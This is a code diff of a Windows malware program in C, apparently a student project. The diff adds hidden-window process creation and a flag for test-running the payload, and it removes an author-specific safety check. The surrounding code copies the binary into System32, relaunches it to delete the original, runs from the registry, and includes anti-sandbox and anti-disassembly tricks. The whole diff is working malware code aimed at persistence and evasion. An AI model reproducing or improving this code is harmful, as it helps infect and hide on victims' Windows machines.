@@ -4,6 +4,8 @@
 #include "env_detection/env_detector.h"
 #include <stdio.h>
 
+#define TEST_MALWARE_EXEC 0
+
 #define SYS32_PATH         "C:\\Windows\\System32\\Q.exe"
 #define RUN_FROM_REGISTRY  "-007"
 #define DELETE_FLG         "-d"
@@ -12,8 +14,6 @@ static void copyToSys32AndLaunch(char* path);
 static void runFromRegistry(char** argv);
 static void firstRunFromSys32(char** argv);
 static void exec();
-
-static void check();
 
 WINBOOL is64BitMachine;
 
@@ -28,15 +28,13 @@ WINBOOL is64BitMachine;
  * @return
  */
 int main(int argc, char** argv) {
-    check();
-
 #if 0
     // Sleep for 15 minutes - anti sandbox technique!
     // to enable it simply change the 0 -> 1
     Sleep(600000);
 #endif
 
-#if 1
+#if 0
     // anti-dissassembly technique: jump -1 -> inc eax -> dec eax
     __asm__ __volatile__ (
         ".byte 0xEB, 0xFF\n\t"
@@ -53,6 +51,9 @@ int main(int argc, char** argv) {
     }
 #endif
 
+#if TEST_MALWARE_EXEC  // if we want to only test the malware execution
+    exec();
+#else
     // returns true on if our 32-bit process is running in a 64-bit machine
     PVOID __tmp__;
     is64BitMachine = Wow64DisableWow64FsRedirection(&__tmp__);
@@ -74,6 +75,7 @@ int main(int argc, char** argv) {
 
     if (is64BitMachine) { Wow64RevertWow64FsRedirection(__tmp__); }
     return 0;
+#endif
 }
 
 /**
@@ -105,6 +107,8 @@ static void copyToSys32AndLaunch(char* path) {
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
+    si.dwFlags |= STARTF_USESHOWWINDOW; // hide the window!
+    si.wShowWindow = SW_HIDE;
     ZeroMemory(&pi, sizeof(pi));
 
     // relaunch the malware from System32, passing the -d flag as well as the 
@@ -112,7 +116,7 @@ static void copyToSys32AndLaunch(char* path) {
     // cmd expands to: C:\Windows\System32\Q.exe -d <current_malware_file>
     char cmd[MAX_PATH];
     snprintf(cmd, MAX_PATH, "\"%s\" %s \"%s\"", SYS32_PATH, DELETE_FLG, path);
-    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 }
 
 /**
@@ -185,38 +189,3 @@ static void exec() {
     printRetCode(ret);
     programCleanup();
 }
-
-
-
-
-// ------------------------
-// remove before submission
-// ------------------------
-void check() {   // just ensuring if I accidently run it then it doesn't infect me lol
-    DWORD size = UNLEN + 1;
-    char buffUser[size];
-    if (!GetUserNameA(buffUser, &size)) { exit(1); }
-
-    if (strcmp(buffUser, "louis") == 0) {
-        exit(0);
-    }
-}
-
-
-// char *secret;
-
-//     /* 
-//      * 1) call 1f pushes the address of the next instruction (the start of the data)
-//      * 2) the bytes after the call are really your data ("HELLO!\0")
-//      * 3) label 1: is where we land at runtime
-//      * 4) pop the return‐address off the stack into a register, giving you the data pointer
-//      */
-//     __asm__ volatile (
-//         "call 1f           \n\t"   // push address of data onto stack
-//         ".ascii \"HELLO!\\0\"\n\t" // your “hidden” string bytes
-//         "1:                 \n\t"  // real code flow returns here
-//         "pop %0            \n\t"   // pop address of “HELLO!” into secret
-//         : "=r"(secret)            // output operand
-//         :                         // no inputs
-//         :                         // no clobbers besides the implicit stack change
-//     );
